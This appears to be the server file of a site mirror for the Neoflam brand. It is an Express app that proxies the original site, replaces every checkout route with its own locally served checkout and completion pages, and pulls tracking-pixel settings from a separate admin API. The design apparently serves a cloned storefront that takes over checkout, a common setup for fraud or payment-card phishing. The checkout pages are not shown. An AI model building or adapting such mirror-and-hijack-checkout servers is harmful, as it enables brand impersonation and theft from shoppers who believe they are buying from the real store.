import 'dotenv/config';
import express from 'express';
import http from 'http';
import path from 'path';
import { fileURLToPath } from 'url';
import { createNeoflamProxy } from './proxy.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PORT = parseInt(process.env.PORT || '3004', 10);
const app = express();

app.disable('x-powered-by');

app.get('/api/settings', async (req, res) => {
  res.set({ 'cache-control': 'no-store', 'access-control-allow-origin': '*' });
  const upstream = (process.env.ADMIN_API_BASE || process.env.SOYBEAN_API_BASE || '').replace(/\/$/, '');
  if (upstream) {
    for (const p of ['/api/settings', '/settings']) {
      try {
        const r = await fetch(`${upstream}${p}`, { headers: { accept: 'application/json' } });
        if (!r.ok) continue;
        const text = await r.text();
        JSON.parse(text);
        res.set('content-type', 'application/json; charset=utf-8');
        res.send(text);
        return;
      } catch {}
    }
  }
  res.set('content-type', 'application/json; charset=utf-8');
  res.json({ data: { fbPixels: [] } });
});

app.use((req, res, next) => {
  const target = req.originalUrl || req.url || '';
  const pathOnly = target.split('?')[0].split('#')[0];
  if (/^\/checkouts(?:\/|$)/i.test(pathOnly)) {
    res.redirect(302, '/checkout/');
    return;
  }
  if (/^\/checkout$/i.test(pathOnly)) {
    res.redirect(302, '/checkout/');
    return;
  }
  next();
});

app.use('/checkout', (req, res, next) => {
  if (req.method !== 'GET' && req.method !== 'HEAD') {
    res.redirect(302, '/checkout/');
    return;
  }
  next();
});

app.use('/checkout', express.static(path.join(__dirname, '..', 'public', 'checkout')));
app.use('/complete', express.static(path.join(__dirname, '..', 'public', 'complete')));

app.use('/', createNeoflamProxy());

const server = http.createServer(app);
server.requestTimeout = 120000;
server.headersTimeout = 125000;
server.keepAliveTimeout = 65000;

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[Neoflam mirror] listening on http://0.0.0.0:${PORT}`);
});
